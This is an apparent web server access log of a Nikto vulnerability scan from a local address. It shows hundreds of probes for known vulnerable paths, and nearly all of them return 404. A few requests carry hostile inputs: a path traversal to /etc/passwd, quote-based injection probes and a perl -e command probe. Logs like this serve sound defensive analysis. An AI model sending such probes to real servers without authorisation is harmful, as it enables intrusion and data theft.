172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/logon.inc HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000175)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/PAGEUTIL.INC HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000176)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/PUBFLD.INC HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000177)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/RENDER.INC HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000178)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/SESSION.INC HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000179)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ows/restricted%2eshow HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000180)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /WEB-INF./web.xml HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000181)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /view_source.jsp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000182)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /w-agora/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000183)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vider.php3 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000184)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/root.asp?acs=anon HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000185)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /officescan/cgi/cgiChkMasterPwd.exe HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000186)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%NETHOOD%/ HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000187)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /pbserver/pbserver.dll HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000199)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /administrator/gallery/uploadimage.php HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000200)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /pafiledb/includes/team/file.php HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000201)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phpEventCalendar/file_upload.php HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000202)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlet/com.unify.servletexec.UploadServlet HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000203)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/cpshost.dll HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000205)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/repost.asp HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000206)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /upload.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000207)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /uploadn.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000208)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /uploadx.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000209)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /wa.exe HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000210)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /basilix/compose-attach.php3 HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000211)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /server/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000212)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /siteminder/smadmin.html HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000214)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ac/data HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000215)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ac/delete HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000216)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ac/edit HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000217)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ac/esave HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000218)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ac/fsave HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000219)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/ac/index HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000220)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/asp/MetaDataUpdate HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000221)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/asp/previewer HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000222)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/asp/status HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000223)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/asp/style HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000224)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/errors HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000225)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/controller HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000226)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/errorpage HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000227)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/initialize HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000228)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/jspstatus HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000229)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/jspstatus56 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000230)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/metadataupdate HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000231)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/previewer HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000232)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/jsp/style HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000233)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/legacy/edit HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000234)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/login HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000235)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webtop/wdk/samples/index.jsp HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000236)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /WEB-INF/web.xml HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000238)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forum/admin/wwforum.mdb HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000239)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /fpdb/shop.mdb HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000240)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /guestbook/admin/o12guest.mdb HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000241)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /midicart.mdb HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000242)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /MIDICART/midicart.mdb HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000243)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000244)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /news/news.mdb HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000245)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /newuser?Image=../../database/rbsserv.mdb HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000246)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /shopdbtest.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000247)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /shopping300.mdb HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000248)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /shopping400.mdb HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000249)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /shoppingdirectory/midicart.mdb HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000250)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SilverStream/Meta/Tables/?access-mode=text HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000251)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /database/db2000.mdb HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000252)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /doc/webmin.config.notes HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000255)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /error/HTTP_NOT_FOUND.html.var HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000256)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /oem_webstage/cgi-bin/oemapp_cgi HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000257)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /admin/config.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000258)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /adm/config.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000258)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /administrator/config.php HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000258)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /?mod=node&nid=some_thing&op=view HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000265)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /?mod=some_thing&op=browse HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000266)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /article.php?article=4965&post=1111111111 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000267)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /blah123.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000268)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /categorie.php3?cid=june HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000269)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /CFIDE/probe.cfm HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000270)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /contents.php?new_language=elvish&mode=select HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000271)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /download.php?op=viewdownload HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000272)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /download.php?op=viewdownload HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000273)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /examples/basic/servlet/HelloServlet HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000274)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /home.php?arsc_language=elvish HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000275)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hostadmin/?page=' HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000276)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /hostadmin/?page=' HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000277)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?file=index.php HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000278)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /jgb_eng_php3/cfooter.php3 HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000279)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ZNOIy.csp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000280)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /modules.php?name=Downloads&d_op=viewdownload HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000281)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /modules.php?name=Downloads&d_op=viewdownload HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000282)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /modules.php?op=modload&name=0&file=0 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000283)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /modules.php?op=modload&name=Sections&file=index&req=viewarticle&artid= HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000284)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000285)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /path/nw/article.php?id=' HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000286)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /path/nw/article.php?id=' HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000287)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /pw/storemgr.pw HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000288)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /rtm.log HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000289)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scozbook/view.php?PG=whatever HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000290)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000291)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /shopa_sessionlist.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000292)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /simplebbs/users/users.php HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000293)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /sips/sipssys/users/a/admin/user HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000294)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /tcb/files/auth/r/root HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000295)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /typo3conf/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000296)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /typo3conf/database.sql HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000297)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /typo3conf/localconf.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000298)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vchat/msg.txt HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000299)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /vgn/license HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000300)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /web.config HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000301)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webamil/test.php?mode=phpinfo HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000302)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart-lite/config/import.txt HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000303)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart-lite/orders/import.txt HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000304)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart/carts/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000305)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart/config/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000306)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart/config/clients.txt HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000307)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart/orders/ HTTP/1.1" 404 470 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000308)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webcart/orders/import.txt HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000309)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webmail/horde/test.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000310)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /whatever190W.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000311)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ws_ftp.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000312)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /WS_FTP.ini HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000313)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /_mem_bin/auoconfig.asp HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000315)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /_mem_bin/auoconfig.asp HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000316)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /_mem_bin/remind.asp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000317)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /exchange/lib/ATTACH.INC HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000318)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/persmbr/vs.asp HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000319)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000320)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000321)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /SiteServer/Admin/knowledge/persmbr/VsTmPr.asp HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000322)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /trace.axd HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000323)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /tvcs/getservers.exe?action=selects1 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000324)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /whatever.htr HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000325)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /./ HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000327)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/fdir.bas:ShowVolume HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000328)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nsn/fdir.bas HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000329)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlet/webacc?User.html=noexist HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000330)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /forum/admin/database/wwForum.mdb HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000331)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webmail/blank.html HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000332)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /jamdb/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000333)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi/cgiproc? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000334)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000339)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cgi-local/cgiemail-1.6/cgicso?query=AAA HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000344)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlet/SchedulerTransfer HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000345)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlet/sunexamples.BBoardServlet HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000346)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlets/SchedulerTransfer HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000347)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /perl/-e%20print%20Hello HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000352)"
